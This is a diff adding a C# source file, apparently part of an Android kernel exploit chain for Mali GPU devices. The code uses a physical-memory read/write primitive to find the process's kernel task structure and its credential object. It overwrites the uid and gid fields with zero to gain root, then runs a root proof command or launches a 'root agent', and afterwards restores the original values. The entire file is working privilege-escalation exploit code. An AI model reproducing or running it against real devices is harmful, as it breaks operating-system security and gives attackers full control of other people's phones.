@@ -1,0 +1,856 @@
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+internal sealed class TaskCredentialProbe
+{
+    private const int TaskTagWords = 4;
+    private const int TaggedWorkerCount = 32;
+    private const int WindowBefore = 0x800;
+    private const int WindowAfter = 0x200;
+    private const ulong KernelLinearMapBase = 0xffffff8000000000UL;
+    private const int CredentialReadWords = 64;
+    private const int MaximumTagCandidates = 128;
+
+    private readonly EglComputeContext compute;
+    private readonly MaliPageTableReclaim reclaim;
+
+    internal TaskCredentialProbe(
+        EglComputeContext compute,
+        MaliPageTableReclaim reclaim)
+    {
+        this.compute = compute;
+        this.reclaim = reclaim;
+    }
+
+    internal bool Inspect(
+        bool isolateCredentials,
+        bool proveRoot,
+        RootAgentLaunch rootAgent = null)
+    {
+        int processId = MaliNative.getpid();
+        uint[] taskTag = CreateTaskTag(processId);
+        Console.WriteLine("task_pid={0}", processId);
+        Console.WriteLine("task_tag_length=15");
+        Console.WriteLine("task_tag={0}", TaskTagText(taskTag));
+        Console.WriteLine(
+            "credential_isolation={0}",
+            isolateCredentials ? "per-worker" : "not-requested");
+        using (TaggedWorkers workers = new TaggedWorkers(
+            TaggedWorkerCount,
+            isolateCredentials,
+            taskTag))
+        {
+            workers.Start();
+            MaliPageTableReclaim.PhysicalMemoryAccessor physical =
+                reclaim.AcquirePhysicalMemoryAccessor(compute);
+            ulong windowStart;
+            uint[] words;
+            ulong found = FindTaskCandidate(
+                physical,
+                taskTag,
+                workers.ThreadIds,
+                unchecked((uint)processId),
+                out windowStart,
+                out words);
+            Console.WriteLine(
+                "task_tag_physical={0}",
+                found == ulong.MaxValue
+                    ? "not_found"
+                    : string.Format("0x{0:x}", found));
+            if (found == ulong.MaxValue)
+            {
+                Console.WriteLine("task_tag_validation=fail");
+                return false;
+            }
+            Console.WriteLine("task_tag_validation=pass");
+
+            Console.WriteLine(
+                "task_window start=0x{0:x} bytes=0x{1:x}",
+                windowStart,
+                words.Length * sizeof(uint));
+            for (int index = 0; index < words.Length; index += 4)
+            {
+                Console.WriteLine(
+                    "task_memory 0x{0:x}: {1:x8} {2:x8} {3:x8} {4:x8}",
+                    windowStart + ((ulong)index * sizeof(uint)),
+                    words[index],
+                    words[index + 1],
+                    words[index + 2],
+                    words[index + 3]);
+            }
+            return InspectCredentials(
+                physical,
+                found,
+                windowStart,
+                words,
+                workers,
+                processId,
+                isolateCredentials,
+                proveRoot,
+                rootAgent);
+        }
+    }
+
+    private bool InspectCredentials(
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical,
+        ulong tagPhysical,
+        ulong windowStart,
+        uint[] taskWords,
+        TaggedWorkers workers,
+        int processId,
+        bool isolatedCredentials,
+        bool proveRoot,
+        RootAgentLaunch rootAgent)
+    {
+        int pidOffset = FindPidPair(
+            taskWords,
+            workers.ThreadIds,
+            unchecked((uint)processId));
+        Console.WriteLine(
+            "task_pid_pair_offset={0}",
+            pidOffset < 0
+                ? "not_found"
+                : string.Format("0x{0:x}", pidOffset * sizeof(uint)));
+        if (pidOffset < 0)
+        {
+            return false;
+        }
+        int selectedThreadId = unchecked((int)taskWords[pidOffset]);
+        Console.WriteLine(
+            "task_pid_pair tid={0} tgid={1}",
+            selectedThreadId,
+            processId);
+        Console.WriteLine("task_selected_worker_tid={0}", selectedThreadId);
+
+        int tagWord = checked((int)((tagPhysical - windowStart) / sizeof(uint)));
+        int credWord = FindDuplicatedKernelPointer(taskWords, tagWord);
+        if (credWord < 0)
+        {
+            Console.WriteLine("task_cred_pointer=not_found");
+            return false;
+        }
+        ulong realCred = Read64(taskWords, credWord);
+        ulong cred = Read64(taskWords, credWord + 2);
+        Console.WriteLine("task_real_cred=0x{0:x16}", realCred);
+        Console.WriteLine("task_cred=0x{0:x16}", cred);
+        Console.WriteLine(
+            "task_cred_pointer_offset=0x{0:x}",
+            credWord * sizeof(uint));
+        if (realCred != cred || realCred < KernelLinearMapBase)
+        {
+            return false;
+        }
+
+        ulong credPhysical = realCred - KernelLinearMapBase;
+        Console.WriteLine("cred_physical=0x{0:x}", credPhysical);
+        if (!IsRamPhysicalAddress(credPhysical))
+        {
+            Console.WriteLine("cred_physical_validation=fail");
+            return false;
+        }
+        Console.WriteLine("cred_physical_validation=pass");
+
+        uint[] credWords = physical.ReadWords(
+            credPhysical & ~3UL,
+            CredentialReadWords);
+        Console.WriteLine("credential_reference_count={0}", credWords[0]);
+        for (int index = 0; index < credWords.Length; index += 4)
+        {
+            Console.WriteLine(
+                "cred_memory 0x{0:x}: {1:x8} {2:x8} {3:x8} {4:x8}",
+                (credPhysical & ~3UL) + ((ulong)index * sizeof(uint)),
+                credWords[index],
+                credWords[index + 1],
+                credWords[index + 2],
+                credWords[index + 3]);
+        }
+
+        uint uid = MaliNative.getuid();
+        uint gid = MaliNative.getgid();
+        int identityWord = FindIdentityFields(credWords, uid, gid);
+        Console.WriteLine("credential_uid={0}", uid);
+        Console.WriteLine("credential_gid={0}", gid);
+        Console.WriteLine(
+            "credential_identity_offset={0}",
+            identityWord < 0
+                ? "not_found"
+                : string.Format("0x{0:x}", identityWord * sizeof(uint)));
+        bool valid = identityWord >= 0;
+        Console.WriteLine(
+            "credential_read_validation={0}",
+            valid ? "pass" : "fail");
+        if (!valid || (!proveRoot && rootAgent == null))
+        {
+            return valid;
+        }
+        if (!isolatedCredentials)
+        {
+            throw new InvalidOperationException(
+                "credential writes require prior credential isolation");
+        }
+        if (credWords[0] != 2)
+        {
+            throw new InvalidOperationException(
+                string.Format(
+                    "credential writes require a private two-reference object, observed {0}",
+                    credWords[0]));
+        }
+        Console.WriteLine("credential_write_reference_guard=pass");
+        Func<bool> rootAction = rootAgent == null
+            ? (Func<bool>)ProveRootOnCurrentThread
+            : rootAgent.LaunchOnCurrentThread;
+        return RunRootActionAndRestore(
+            physical,
+            credPhysical + ((ulong)identityWord * sizeof(uint)),
+            workers,
+            selectedThreadId,
+            uid,
+            gid,
+            rootAction,
+            rootAgent == null ? "proof" : "agent-launch");
+    }
+
+    private static bool RunRootActionAndRestore(
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical,
+        ulong identityPhysical,
+        TaggedWorkers workers,
+        int selectedThreadId,
+        uint uid,
+        uint gid,
+        Func<bool> rootAction,
+        string actionName)
+    {
+        uint[] original = { uid, gid, uid, gid, uid, gid, uid, gid };
+        uint[] zeroes = new uint[original.Length];
+        bool writeAttempted = false;
+        bool rootObserved = false;
+        try
+        {
+            uint[] before = physical.ReadWords(identityPhysical, original.Length);
+            RequireWords("credential_prewrite", before, original);
+            writeAttempted = true;
+            uint[] writeObserved = physical.WriteWords(identityPhysical, zeroes);
+            RequireWords("credential_write", writeObserved, zeroes);
+            uint[] after = physical.ReadWords(identityPhysical, zeroes.Length);
+            RequireWords("credential_write_readback", after, zeroes);
+
+            try
+            {
+                rootObserved = workers.RunOnThread(
+                    selectedThreadId,
+                    rootAction);
+            }
+            catch (Exception exception)
+            {
+                Console.Error.WriteLine(
+                    "root_task_action_exception stage=agent-launch type={0} message={1}",
+                    exception.GetType().Name,
+                    exception.Message);
+                throw;
+            }
+        }
+        finally
+        {
+            if (writeAttempted)
+            {
+                uint[] restoreObserved = physical.WriteWords(
+                    identityPhysical,
+                    original);
+                RequireWords(
+                    "credential_restore_write",
+                    restoreObserved,
+                    original);
+                uint[] restored = physical.ReadWords(
+                    identityPhysical,
+                    original.Length);
+                RequireWords(
+                    "credential_restore_readback",
+                    restored,
+                    original);
+                bool restoredIdentity;
+                try
+                {
+                    restoredIdentity = workers.RunOnThread(
+                        selectedThreadId,
+                        delegate
+                        {
+                            uint restoredUid = MaliNative.getuid();
+                            uint restoredEuid = MaliNative.geteuid();
+                            uint restoredGid = MaliNative.getgid();
+                            uint restoredEgid = MaliNative.getegid();
+                            Console.WriteLine(
+                                "credential_restored uid={0} euid={1} gid={2} egid={3}",
+                                restoredUid,
+                                restoredEuid,
+                                restoredGid,
+                                restoredEgid);
+                            return restoredUid == uid
+                                && restoredEuid == uid
+                                && restoredGid == gid
+                                && restoredEgid == gid;
+                        });
+                }
+                catch (Exception exception)
+                {
+                    Console.Error.WriteLine(
+                        "root_task_action_exception stage=restore-validation type={0} message={1}",
+                        exception.GetType().Name,
+                        exception.Message);
+                    throw;
+                }
+                if (!restoredIdentity)
+                {
+                    throw new InvalidOperationException(
+                        "worker identity did not return to its original values");
+                }
+            }
+        }
+        Console.WriteLine(
+            "root_task_action name={0} result={1}",
+            actionName,
+            rootObserved ? "pass" : "fail");
+        return rootObserved;
+    }
+
+    private static bool ProveRootOnCurrentThread()
+    {
+        uint postUid = MaliNative.getuid();
+        uint postEuid = MaliNative.geteuid();
+        uint postGid = MaliNative.getgid();
+        uint postEgid = MaliNative.getegid();
+        Console.WriteLine(
+            "credential_postwrite tid={0} uid={1} euid={2} gid={3} egid={4}",
+            MaliNative.gettid(),
+            postUid,
+            postEuid,
+            postGid,
+            postEgid);
+        bool root = postUid == 0
+            && postEuid == 0
+            && postGid == 0
+            && postEgid == 0;
+        Console.WriteLine("credential_uid0={0}", root ? "yes" : "no");
+        if (!root)
+        {
+            return false;
+        }
+        Console.WriteLine("root_child_proof_begin");
+        int childStatus = MaliNative.system(
+            "id; grep '^CapEff:' /proc/self/status; cat /proc/self/attr/current");
+        Console.WriteLine("root_child_status=0x{0:x}", childStatus);
+        return childStatus == 0;
+    }
+
+    private static void RequireWords(
+        string operation,
+        uint[] observed,
+        uint[] expected)
+    {
+        if (observed.Length != expected.Length)
+        {
+            throw new InvalidOperationException(operation + " length mismatch");
+        }
+        for (int index = 0; index < observed.Length; index++)
+        {
+            if (observed[index] != expected[index])
+            {
+                throw new InvalidOperationException(
+                    string.Format(
+                        "{0} mismatch at word {1}: 0x{2:x8} != 0x{3:x8}",
+                        operation,
+                        index,
+                        observed[index],
+                        expected[index]));
+            }
+        }
+        Console.WriteLine("{0}=pass", operation);
+    }
+
+    private static void IsolateCurrentThreadCredentials()
+    {
+        if (IntPtr.Size != sizeof(uint))
+        {
+            throw new PlatformNotSupportedException(
+                "credential isolation requires the 32-bit ARM process");
+        }
+        uint uid = MaliNative.getuid();
+        int result = MaliNative.syscall3(
+            MaliNative.ArmSetresuid32Syscall,
+            uid,
+            uid,
+            uid);
+        Console.WriteLine(
+            "private_credential_clone tid={0} result={1} errno={2} uid={3}",
+            MaliNative.gettid(),
+            result,
+            Marshal.GetLastWin32Error(),
+            uid);
+        if (result != 0 || MaliNative.getuid() != uid)
+        {
+            throw new InvalidOperationException(
+                "same-identity credential clone failed");
+        }
+    }
+
+    private static int FindPidPair(
+        uint[] words,
+        int[] workerThreadIds,
+        uint processId)
+    {
+        for (int index = 0; index + 1 < words.Length; index++)
+        {
+            if (words[index + 1] != processId)
+            {
+                continue;
+            }
+            foreach (int threadId in workerThreadIds)
+            {
+                if (words[index] == unchecked((uint)threadId))
+                {
+                    return index;
+                }
+            }
+        }
+        return -1;
+    }
+
+    private static ulong FindTaskCandidate(
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical,
+        uint[] taskTag,
+        int[] workerThreadIds,
+        uint processId,
+        out ulong selectedWindowStart,
+        out uint[] selectedWords)
+    {
+        uint encodedNeedle0 = taskTag[0] ^ EglComputeContext.NeedleMask0;
+        uint encodedNeedle1 = taskTag[1] ^ EglComputeContext.NeedleMask1;
+        uint encodedNeedle2 = taskTag[2] ^ EglComputeContext.NeedleMask2;
+        uint encodedNeedle3 = taskTag[3] ^ EglComputeContext.NeedleMask3;
+        ulong found = physical.FindPattern(
+            encodedNeedle0,
+            encodedNeedle1,
+            encodedNeedle2,
+            encodedNeedle3,
+            delegate { });
+        int candidateCount = 0;
+        while (found != ulong.MaxValue)
+        {
+            ulong pageStart = found & ~((ulong)MaliNative.PageSize - 1);
+            uint[] pageWords = physical.ReadWords(
+                pageStart,
+                (MaliNative.PageSize / sizeof(uint)) + TaskTagWords - 1);
+            int firstWord = checked((int)((found - pageStart) / sizeof(uint)));
+            for (int index = firstWord;
+                index + TaskTagWords <= pageWords.Length;
+                index++)
+            {
+                if (!WordsMatch(pageWords, index, taskTag))
+                {
+                    continue;
+                }
+                candidateCount++;
+                if (candidateCount > MaximumTagCandidates)
+                {
+                    Console.WriteLine(
+                        "task_tag_candidate_limit={0}",
+                        MaximumTagCandidates);
+                    selectedWindowStart = 0;
+                    selectedWords = null;
+                    return ulong.MaxValue;
+                }
+                ulong candidate = pageStart + ((ulong)index * sizeof(uint));
+                string rejection;
+                if (TryReadTaskCandidate(
+                    physical,
+                    candidate,
+                    taskTag,
+                    workerThreadIds,
+                    processId,
+                    out selectedWindowStart,
+                    out selectedWords,
+                    out rejection))
+                {
+                    Console.WriteLine(
+                        "task_tag_candidate physical=0x{0:x} result=selected",
+                        candidate);
+                    return candidate;
+                }
+                Console.WriteLine(
+                    "task_tag_candidate physical=0x{0:x} result=rejected reason={1}",
+                    candidate,
+                    rejection);
+            }
+            found = physical.FindPatternAfter(
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                pageStart);
+        }
+        selectedWindowStart = 0;
+        selectedWords = null;
+        return ulong.MaxValue;
+    }
+
+    private static bool TryReadTaskCandidate(
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical,
+        ulong candidate,
+        uint[] taskTag,
+        int[] workerThreadIds,
+        uint processId,
+        out ulong windowStart,
+        out uint[] words,
+        out string rejection)
+    {
+        windowStart = 0;
+        words = null;
+        if (candidate < WindowBefore)
+        {
+            rejection = "window-underflow";
+            return false;
+        }
+        try
+        {
+            if (!IsCurrentTaskTag(physical, candidate, taskTag))
+            {
+                rejection = "tag-readback";
+                return false;
+            }
+            windowStart = (candidate - WindowBefore) & ~3UL;
+            int wordCount = (WindowBefore + WindowAfter) / sizeof(uint);
+            words = physical.ReadWords(windowStart, wordCount);
+            int pidOffset = FindPidPair(words, workerThreadIds, processId);
+            if (pidOffset < 0)
+            {
+                rejection = "live-pid-pair";
+                words = null;
+                return false;
+            }
+            int tagWord = checked((int)((candidate - windowStart) / sizeof(uint)));
+            if (FindDuplicatedKernelPointer(words, tagWord) < 0)
+            {
+                rejection = "credential-pointers";
+                words = null;
+                return false;
+            }
+        }
+        catch (InvalidOperationException exception)
+        {
+            rejection = "read-fault:" + exception.Message.Replace(' ', '_');
+            words = null;
+            return false;
+        }
+        rejection = null;
+        return true;
+    }
+
+    private static bool WordsMatch(uint[] haystack, int index, uint[] needle)
+    {
+        for (int offset = 0; offset < needle.Length; offset++)
+        {
+            if (haystack[index + offset] != needle[offset])
+            {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    private static int FindDuplicatedKernelPointer(uint[] words, int tagWord)
+    {
+        int first = Math.Max(0, tagWord - (0x80 / sizeof(uint)));
+        for (int index = tagWord - 6; index >= first; index -= 2)
+        {
+            ulong firstPointer = Read64(words, index);
+            ulong secondPointer = Read64(words, index + 2);
+            if (firstPointer == secondPointer
+                && firstPointer >= KernelLinearMapBase
+                && (firstPointer & 7UL) == 0)
+            {
+                return index;
+            }
+        }
+        return -1;
+    }
+
+    private static int FindIdentityFields(uint[] words, uint uid, uint gid)
+    {
+        uint[] expected = { uid, gid, uid, gid, uid, gid, uid, gid };
+        for (int index = 0; index + expected.Length <= words.Length; index++)
+        {
+            bool match = true;
+            for (int field = 0; field < expected.Length; field++)
+            {
+                if (words[index + field] != expected[field])
+                {
+                    match = false;
+                    break;
+                }
+            }
+            if (match)
+            {
+                return index;
+            }
+        }
+        return -1;
+    }
+
+    private static ulong Read64(uint[] words, int index)
+    {
+        return words[index] | ((ulong)words[index + 1] << 32);
+    }
+
+    private static bool IsRamPhysicalAddress(ulong address)
+    {
+        return (address >= 0x20000000UL && address < 0x80000000UL)
+            || (address >= 0x80000000UL && address < 0xc0000000UL)
+            || (address >= 0xc0000000UL && address < 0xd0000000UL);
+    }
+
+    private static bool IsCurrentTaskTag(
+        MaliPageTableReclaim.PhysicalMemoryAccessor physical,
+        ulong candidate,
+        uint[] expected)
+    {
+        uint[] words = physical.ReadWords(candidate, TaskTagWords);
+        bool valid = words[0] == expected[0]
+            && words[1] == expected[1]
+            && words[2] == expected[2]
+            && words[3] == expected[3];
+        Console.WriteLine(
+            "task_tag_candidate_readback physical=0x{0:x} words={1:x8},{2:x8},{3:x8},{4:x8} valid={5}",
+            candidate,
+            words[0],
+            words[1],
+            words[2],
+            words[3],
+            valid ? "yes" : "no");
+        return valid;
+    }
+
+    private static uint[] CreateTaskTag(int processId)
+    {
+        string text = string.Format(
+            "q9f{0:x8}{1:x4}",
+            unchecked((uint)processId),
+            unchecked((uint)Environment.TickCount) & 0xffffU);
+        byte[] bytes = new byte[TaskTagWords * sizeof(uint)];
+        Encoding.ASCII.GetBytes(text).CopyTo(bytes, 0);
+        uint[] words = new uint[TaskTagWords];
+        for (int index = 0; index < words.Length; index++)
+        {
+            words[index] = BitConverter.ToUInt32(bytes, index * sizeof(uint));
+        }
+        return words;
+    }
+
+    private static string TaskTagText(uint[] words)
+    {
+        byte[] bytes = new byte[words.Length * sizeof(uint)];
+        for (int index = 0; index < words.Length; index++)
+        {
+            BitConverter.GetBytes(words[index]).CopyTo(
+                bytes,
+                index * sizeof(uint));
+        }
+        return Encoding.ASCII.GetString(bytes).TrimEnd('\0');
+    }
+
+    private static void SetTaskTag(uint[] taskTag)
+    {
+        IntPtr tag = Marshal.AllocHGlobal(16);
+        try
+        {
+            for (int index = 0; index < taskTag.Length; index++)
+            {
+                Marshal.WriteInt32(
+                    tag,
+                    index * sizeof(uint),
+                    unchecked((int)taskTag[index]));
+            }
+            MaliNative.RequireSuccess(
+                "set_task_tag",
+                MaliNative.prctl(
+                    MaliNative.PrSetName,
+                    tag,
+                    UIntPtr.Zero,
+                    UIntPtr.Zero,
+                    UIntPtr.Zero));
+        }
+        finally
+        {
+            for (int offset = 0; offset < 16; offset += sizeof(int))
+            {
+                Marshal.WriteInt32(tag, offset, 0);
+            }
+            Marshal.FreeHGlobal(tag);
+        }
+    }
+
+    private sealed class TaggedWorkers : IDisposable
+    {
+        private readonly CountdownEvent ready;
+        private readonly ManualResetEvent release = new ManualResetEvent(false);
+        private readonly List<Thread> threads = new List<Thread>();
+        private readonly AutoResetEvent[] execute;
+        private readonly ManualResetEvent[] completed;
+        private readonly Func<bool>[] actions;
+        private readonly bool[] actionResults;
+        private readonly Exception[] actionFailures;
+        private readonly int[] threadIds;
+        private readonly bool isolateCredentials;
+        private readonly uint[] taskTag;
+        private Exception failure;
+
+        internal int[] ThreadIds
+        {
+            get { return threadIds; }
+        }
+
+        internal TaggedWorkers(
+            int count,
+            bool isolateCredentials,
+            uint[] taskTag)
+        {
+            ready = new CountdownEvent(count);
+            threadIds = new int[count];
+            execute = new AutoResetEvent[count];
+            completed = new ManualResetEvent[count];
+            actions = new Func<bool>[count];
+            actionResults = new bool[count];
+            actionFailures = new Exception[count];
+            this.isolateCredentials = isolateCredentials;
+            this.taskTag = taskTag;
+            for (int index = 0; index < count; index++)
+            {
+                execute[index] = new AutoResetEvent(false);
+                completed[index] = new ManualResetEvent(false);
+            }
+        }
+
+        internal void Start()
+        {
+            for (int index = 0; index < threadIds.Length; index++)
+            {
+                int workerIndex = index;
+                Thread thread = new Thread(
+                    delegate()
+                    {
+                        try
+                        {
+                            threadIds[workerIndex] = MaliNative.gettid();
+                            if (isolateCredentials)
+                            {
+                                IsolateCurrentThreadCredentials();
+                            }
+                            SetTaskTag(taskTag);
+                        }
+                        catch (Exception exception)
+                        {
+                            lock (threads)
+                            {
+                                if (failure == null)
+                                {
+                                    failure = exception;
+                                }
+                            }
+                        }
+                        finally
+                        {
+                            ready.Signal();
+                        }
+                        WaitHandle[] signals = { release, execute[workerIndex] };
+                        while (WaitHandle.WaitAny(signals) == 1)
+                        {
+                            try
+                            {
+                                Func<bool> action;
+                                lock (actions)
+                                {
+                                    action = actions[workerIndex];
+                                }
+                                actionResults[workerIndex] = action();
+                            }
+                            catch (Exception exception)
+                            {
+                                actionFailures[workerIndex] = exception;
+                            }
+                            finally
+                            {
+                                completed[workerIndex].Set();
+                            }
+                        }
+                    });
+                thread.IsBackground = true;
+                thread.Start();
+                threads.Add(thread);
+            }
+            ready.Wait();
+            if (failure != null)
+            {
+                throw new InvalidOperationException(
+                    "tagged worker setup failed",
+                    failure);
+            }
+            for (int index = 0; index < threadIds.Length; index++)
+            {
+                Console.WriteLine(
+                    "task_worker_tid index={0} tid={1}",
+                    index,
+                    threadIds[index]);
+            }
+            Thread.Sleep(50);
+        }
+
+        internal bool RunOnThread(int threadId, Func<bool> action)
+        {
+            int index = Array.IndexOf(threadIds, threadId);
+            if (index < 0)
+            {
+                throw new InvalidOperationException(
+                    "selected task does not belong to a tagged worker");
+            }
+            completed[index].Reset();
+            actionResults[index] = false;
+            actionFailures[index] = null;
+            lock (actions)
+            {
+                actions[index] = action;
+            }
+            execute[index].Set();
+            completed[index].WaitOne();
+            if (actionFailures[index] != null)
+            {
+                throw new InvalidOperationException(
+                    string.Format(
+                        "tagged worker action failed: {0}: {1}",
+                        actionFailures[index].GetType().Name,
+                        actionFailures[index].Message),
+                    actionFailures[index]);
+            }
+            return actionResults[index];
+        }
+
+        public void Dispose()
+        {
+            release.Set();
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+            foreach (AutoResetEvent signal in execute)
+            {
+                signal.Dispose();
+            }
+            foreach (ManualResetEvent signal in completed)
+            {
+                signal.Dispose();
+            }
+            release.Dispose();
+            ready.Dispose();
+        }
+    }
+}
